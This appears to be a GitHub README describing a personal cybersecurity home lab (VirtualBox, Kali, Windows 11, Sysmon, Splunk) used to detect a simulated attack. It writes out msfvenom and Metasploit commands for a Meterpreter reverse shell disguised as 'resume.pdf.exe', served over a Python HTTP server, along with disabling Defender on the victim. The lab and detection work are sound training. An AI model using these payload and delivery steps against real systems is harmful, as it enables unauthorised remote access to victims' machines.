# 🧪 Building My First Home Lab (Cybersecurity Edition)

A simple and effective home lab setup for practicing cybersecurity — including safe malware analysis, telemetry collection, and attack simulation using **VirtualBox**, **Kali Linux**, **Windows 11**, **Sysmon**, and **Splunk**.

🔗 [Read the full blog post on Medium](https://medium.com/@vinuvarshith95/building-my-first-home-lab-b51d83145691)

## 🎯 Objective

To create a secure, isolated virtual environment for:

- Practicing blue team techniques  
- Understanding endpoint telemetry  
- Performing safe malware analysis  
- Simulating cyberattacks and visualizing them with Splunk  

## 🛠 Tools Used

| Tool/OS            | Purpose                                     |
|--------------------|---------------------------------------------|
| VirtualBox         | Virtualization platform                     |
| Kali Linux         | Attacker machine (penetration testing)      |
| Windows 11 Home    | Victim machine (target for simulation)      |
| Sysmon             | Collecting rich system telemetry            |
| Splunk Enterprise  | Log collection, analysis, and detection     |
| Metasploit         | Simulating attacks (reverse shell)          |
| msfvenom           | Generating custom payloads                  |
| Python HTTP Server | Hosting malicious payloads                  |

## 🧠 Skills Learned

- Creating attacker/victim VMs  
- Safe malware execution and isolation  
- Sysmon configuration and log collection  
- Using Splunk for real-time telemetry analysis  
- Network configuration (NAT vs Internal)  
- Hands-on red teaming and threat simulation  

## 🪜 Setup Steps

### 1. Virtual Machine Setup

- Installed VirtualBox  
- Created two VMs:  
  - **Kali Linux (Attacker):** 4GB RAM, 2 CPUs, 25GB disk  
  - **Windows 11 (Victim):** 4GB RAM, 2 CPUs, 50GB disk  

![image](https://github.com/user-attachments/assets/8e521224-81c0-465c-a53f-21d3d9497bd7)


### 2. Install Sysmon on Windows

- Downloaded `Sysmon64.exe` and `sysmonconfig.xml` (from Olaf Hartong’s GitHub)  
- Opened PowerShell as Administrator and ran:
```.\Sysmon64.exe -accepteula -i sysmonconfig.xml```
- Verified installation in **Event Viewer** under:  
`Applications and Services Logs > Microsoft > Windows > Sysmon > Operational`

![image](https://github.com/user-attachments/assets/a71cf721-8560-46db-8ad6-2032dcf9015e)


### 3. Install Splunk

- Downloaded Splunk Enterprise trial for Windows  
- Installed and accessed Splunk at: `http://localhost:8000`
- Clicked **Add Data → Monitor → Local Event Logs**  
- Selected log sources: **Security**, **System**, **Application**

![image](https://github.com/user-attachments/assets/77efbae8-c6f0-4e23-ab87-b4525d5a2d20)


### 4. Virtual Network Configuration

#### Scenario 1: Tool Testing  
- Used **default NAT** mode  

#### Scenario 2: Malware Analysis  
- Switched to **Internal Network** for both VMs  
- Assigned static IPs:  
- Windows: `192.168.20.10`  
- Kali Linux: `192.168.20.11`  
- Verified connectivity using `ping` between VMs  

### 5. Simulated Attack

**From Kali Linux:**

- Port scanning the victim: `nmap -A 192.168.20.10`
  ![image](https://github.com/user-attachments/assets/27ea1cb9-4300-4812-b50d-625266d05d11)
- Creating a reverse shell payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o resume.pdf.exe`
- Setting up a Metasploit listener:
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
exploit
```
- Hosting the payload via Python:  `python3 -m http.server 9999`

**From Windows:**

- Disabled Defender temporarily  
- Accessed Kali’s HTTP server in the browser:  
`http://192.168.20.11:9999`  
- Downloaded and executed the payload: `resume.pdf.exe`  
- Verified the reverse shell back to Kali

  ![image](https://github.com/user-attachments/assets/0d75a4ec-baa5-4ed3-9aa1-d8ca549c13b4)


### 6. Log Analysis in Splunk

- Edited the file:  
`C:\Program Files\Splunk\etc\system\local\inputs.conf`  
to include Sysmon logs  
- Restarted the **Splunkd** service via `services.msc`  
- Created a new Splunk index: `endpoint`  
- Installed the **Splunk Add-on for Sysmon**  
- Ran queries like:
```
index=endpoint 192.168.20.11
index=endpoint resume.pdf.exe
index=endpoint EventCode=29
```

![image](https://github.com/user-attachments/assets/75baa6b2-3a47-4af6-a154-776e6d8fca50)


## 📊 Outcome

- Successfully captured and visualized simulated attacks  
- Validated the power of Sysmon + Splunk for endpoint detection  
- Built a reusable lab for continuous learning and testing  










